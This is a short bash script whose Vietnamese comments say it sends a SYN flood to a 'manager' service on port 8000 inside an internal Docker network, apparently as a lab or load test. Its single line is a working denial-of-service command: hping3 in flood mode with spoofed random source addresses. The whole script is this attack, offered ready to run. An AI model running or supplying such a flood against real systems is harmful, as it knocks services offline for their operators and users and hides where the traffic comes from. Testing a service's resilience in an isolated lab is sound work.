#!/bin/bash
# Gửi SYN flood tới Manager (port 8000) hoặc IP của container manager.
# Địa chỉ IP của manager trong mạng Docker nội bộ là "manager" (hostname)
hping3 -S -p 8000 --flood --rand-source manager